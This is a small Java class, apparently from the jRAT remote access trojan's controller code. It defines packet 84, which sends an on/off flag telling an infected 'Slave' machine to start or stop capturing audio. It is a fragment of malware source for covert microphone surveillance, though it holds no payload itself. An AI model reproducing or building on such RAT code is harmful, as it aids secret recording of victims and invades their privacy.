package su.jrat.client.packets.outgoing;

import java.io.DataOutputStream;

import su.jrat.client.Slave;


public class Packet84SoundCapture extends AbstractOutgoingPacket {

	private boolean enable;

	public Packet84SoundCapture(boolean enable) {
		this.enable = enable;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeBoolean(enable);
	}

	@Override
	public byte getPacketId() {
		return 84;
	}

}
